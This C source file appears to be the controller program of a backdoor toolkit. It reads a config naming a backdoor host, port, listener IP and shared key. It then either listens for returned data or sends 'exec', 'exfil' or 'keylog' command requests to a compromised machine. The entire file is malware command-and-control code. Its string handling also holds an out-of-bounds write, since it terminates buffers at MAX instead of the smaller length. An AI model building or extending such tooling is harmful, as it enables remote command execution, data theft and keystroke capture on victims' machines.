/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>

#include "common.h"
#include "util.h"
#include "client.h"

FILE *log_file;

void parse_config_file(FILE *fp, int *mode, unsigned short *listener_port, char *listener_ip, char *shared_key, char *backdoor_host, unsigned short *backdoor_port, char *command, char *data)
{
    char *var = NULL;
    char *val = NULL;
    char *line_buffer = NULL;
    ssize_t nbytes = 0;

    while((nbytes = getline(&line_buffer, &nbytes, fp)) > 0)
    {
        line_buffer[nbytes - 1] = 0;

        if((var = strtok(line_buffer, "=")) != NULL)
        {
            if((val = strtok(NULL, "=")) != NULL)
            {
                if(!strcmp(var, "MODE"))
                {
                    if(!strcasecmp(val, "listener"))
                    {
                        *mode = LISTENER;
                    }
                    else
                    {
                        *mode = CLIENT;
                    }
                }
                else if(!strcmp(var, "LISTENER_IP"))
                {
                    strncpy(listener_ip, val, MAX_FIELD_LEN);
                    listener_ip[MAX(strlen(val), MAX_FIELD_LEN)] = 0;
                }
                else if(!strcmp(var, "LISTENER_PORT"))
                {
                    *listener_port = (unsigned short)atoi(val);
                }
                else if(!strcmp(var, "SHARED_KEY"))
                {                    
                    strncpy(shared_key, val, MAX_FIELD_LEN);
                    shared_key[MAX(strlen(val), MAX_FIELD_LEN)] = 0;
                }
                else if(!strcmp(var, "BACKDOOR_HOST"))
                {
                    strncpy(backdoor_host, val, MAX_FIELD_LEN);
                    backdoor_host[MAX(strlen(val), MAX_FIELD_LEN)] = 0;
                }
                else if(!strcmp(var, "BACKDOOR_PORT"))
                {
                    *backdoor_port = (unsigned short)atoi(val);
                }
                else if(!strcmp(var, "COMMAND"))
                {
                    if(!strcasecmp(val, "exec"))
                    {
                        *command = CMD_REQ_OPCODE_EXEC;
                    }
                    else if(!strcasecmp(val, "exfil"))
                    {
                        *command = CMD_REQ_OPCODE_EXFIL;
                    }
                    else if(!strcasecmp(val, "keylog"))
                    {
                        *command = CMD_REQ_OPCODE_KEYLOG;
                    }
                }
                else if(!strcmp(var, "DATA"))
                {
                    strncpy(data, val, MAX_FIELD_LEN);
                    data[MAX(strlen(val), MAX_FIELD_LEN)] = 0;
                }
            }
        }
    }
}

void usage(const char *str)
{
    fprintf(stderr, "RTFM\n");
}

int main(int argc, char **argv)
{
    int rc = -1;
    int opt;
    FILE *cfg_file = NULL;
    int mode; 
    char command;
    unsigned short listener_port;
    unsigned short backdoor_port;
    char data[MAX_FIELD_LEN + 1];
    char shared_key[MAX_FIELD_LEN + 1];
    char listener_ip[MAX_FIELD_LEN + 1];
    char backdoor_host[MAX_FIELD_LEN + 1];
    
    while((opt = getopt(argc, argv, "c:h")) != -1)
    {
        switch(opt)
        {
            case 'c':
                if((cfg_file = fopen(optarg, "r")) == NULL)
                {
                   //dbg_print("%s: fopen failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
                   goto end_of_func;
                }

                break;

            case 'h':
            case '?':
            default:
                break;
        }
    }

    if(cfg_file == NULL)
    {
        usage(argv[0]);
        exit(1);
    }

    parse_config_file(cfg_file, &mode, &listener_port, listener_ip, shared_key, backdoor_host, &backdoor_port, &command, data);

    if(mode == LISTENER)
    {
        run_listener(listener_port, shared_key);
    }
    else if(mode == CLIENT)
    {
        send_command_request(backdoor_host, backdoor_port, shared_key, listener_ip, command, data);
    }

end_of_func:
    if(cfg_file != NULL)
    {
        fclose(cfg_file);
    }

    return rc;
}

